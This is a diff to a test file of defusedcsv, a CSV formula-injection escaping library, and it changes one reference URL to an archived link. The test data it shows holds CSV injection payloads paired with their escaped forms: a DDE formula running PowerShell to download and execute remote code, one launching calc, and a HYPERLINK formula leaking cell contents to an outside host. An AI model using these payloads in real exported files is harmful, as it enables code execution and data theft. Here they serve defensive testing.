@@ -20,7 +20,7 @@ from defusedcsv.csv import _escape as escape
     ("@SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0", "'@SUM(1+1)*cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0"),
     # https://hackerone.com/reports/72785
     ("-2+3+cmd|' /C calc'!A0", "'-2+3+cmd\\|' /C calc'!A0"),
-    # https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/
+    # https://web.archive.org/web/20220516052229/https://www.contextis.com/us/blog/comma-separated-vulnerabilities
     ('=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")',
      '\'=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")'),
 
